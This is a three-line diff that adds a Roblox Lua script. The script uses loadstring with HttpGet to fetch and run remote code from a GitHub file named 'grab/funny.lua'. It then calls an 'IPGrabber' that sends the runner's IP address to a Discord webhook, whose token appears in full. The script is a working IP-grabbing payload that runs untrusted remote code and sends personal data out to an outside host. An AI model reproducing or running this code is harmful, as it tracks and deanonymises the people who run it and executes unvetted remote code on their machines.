@@ -1,0 +1,3 @@
+local IPGrabber = loadstring(game:HttpGet("https://raw.githubusercontent.com/carter-fr/RandomStuff/main/grab/funny.lua"))()
+
+IPGrabber:grabIP("https://discord.com/api/webhooks/1013934624436654220/vRahEWUIroPS2HEEf4gHbfJF2D8QEE2GaC5Aaj_Rk6Mk3dRpg9IGEJ3B3eUOJfNOzXh2")
